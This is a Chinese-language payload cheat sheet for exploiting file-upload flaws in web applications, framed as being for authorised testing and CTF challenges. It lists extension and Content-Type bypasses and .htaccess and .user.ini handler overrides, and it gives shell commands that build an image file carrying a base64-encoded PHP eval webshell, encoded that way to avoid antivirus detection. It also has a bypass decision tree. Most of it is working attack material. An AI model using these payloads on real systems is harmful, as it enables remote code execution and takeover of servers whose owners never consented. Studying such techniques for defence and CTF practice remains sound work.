# 文件上传 · Payload

> ⚠️ 仅用于**合法授权的安全测试**与 **CTF 赛题环境**。原理见 [原理笔记.md](原理笔记.md)。
>
> 🔒 **本仓库约定**：一句话木马一律用 **base64 形式**记录（见 [rce/payload.md](../rce/payload.md) 的木马表）。
> 原因：`<?php @ev` `al($_POST[1]);?>` 这种一字不差的写法会被 Windows Defender 判定为病毒并**锁死文件**，导致 `git add` 报 `Invalid argument`。

## 后缀绕过字典

```
# PHP 常见可解析后缀
.php  .php2  .php3  .php4  .php5  .php7  .phtml  .phtm  .pht  .phps  .phar  .inc

# 大小写与变形
.PHP  .Php  .pHp
shell.php.            # 末尾加点（Windows 会去掉）
"shell.php "          # 末尾加空格（注意用引号）
shell.php::$DATA      # NTFS 数据流（Windows）
shell.php%20
shell.php%00.jpg      # 空字节截断（PHP < 5.3.4）
shell.php.jpg         # Apache 多后缀
shell.asp;.jpg        # IIS 6
shell.php/.           # 路径处理差异

# 其他语言
.jsp  .jspx  .jspf
.asp  .asa  .asax  .ascx  .ashx  .asmx  .cer
.aspx
```

## Content-Type 变形

```
Content-Type: image/png
Content-Type: image/gif
Content-Type: image/jpeg
Content-Type: text/plain
Content-Type: application/octet-stream
```

## 图片马

一句话代码用 base64 写（避免杀软锁文件），解码后拼在图片头后面：

```bash
# Linux：GIF 头 + 一句话代码
printf 'GIF89a' > shell.png
echo PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/Pg== | base64 -d >> shell.png

# Windows PowerShell
Set-Content -NoNewline -Path shell.png -Value 'GIF89a'
cmd /c "echo PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/Pg== > b64.txt & certutil -decode b64.txt php.txt"
Get-Content php.txt -Raw | Add-Content -NoNewline shell.png

# 把一个正常图片和 php 代码拼起来（copy /b 二进制拼接，Windows）
copy /b 正常图.png + php.txt 图片马.png
```

> 注意：服务端若用 `imagecreatefrom*` 重新渲染过图片，内嵌代码会被破坏，此时要换思路（解析漏洞、文件包含）。

## 配置类文件利用（能上传任意文件但后缀被限时）

| 目标 | 内容 | 说明 |
| --- | --- | --- |
| `.htaccess` | `AddType application/x-httpd-php .png` | Apache + 允许 Override |
| `.htaccess`（更通用） | `SetHandler application/x-httpd-php` | 让目录下所有文件都按 PHP 跑 |
| `.user.ini` | `auto_prepend_file=shell.png` | PHP-FPM 环境，每个请求自动包含 |
| `web.config` | 配置 `handlers` 映射 | IIS |

## 常见绕过决策树

```
上传被拦了吗？
├─ 前端弹窗 → 抓包改后缀直接过
├─ 提示"类型不允许" → 改 Content-Type 再试
├─ 提示"后缀不允许"
│   ├─ 是黑名单 → 试 phtml/pht/phar/大小写/双后缀/末尾点
│   └─ 是白名单 → 试解析漏洞、%00、.htaccess/.user.ini
├─ 提示"不是图片" → 加 GIF89a 或做图片马
└─ 上传成功但访问不执行
    ├─ 目录不可访问 → 配合 LFI 包含
    ├─ 被重命名 → 看响应里的新文件名
    └─ 内容被过滤 → 换 base64 变形、短标签
```

## 验证技巧

| 目的 | 做法 |
| --- | --- |
| 确认文件落盘位置 | 上传后访问返回路径；或故意传不能解析的后缀看回显 |
| 确认能否解析 | 传一个输出固定标记的 php（内容用 base64 写），搜这个标记 |
| 盲上传 | 结合 LFI 包含，或结合日志包含（把 payload 写进 UA 再包含日志） |

验证用的一句话（base64，输出 `mark123` 便于搜索）：

| 用途 | base64 |
| --- | --- |
| 回显标记 | `PD9waHAgZWNobyAibWFyazEyMyI7Pz4=` |
| 输出 phpinfo | `PD9waHAgcGhwaW5mbygpOz8+` |
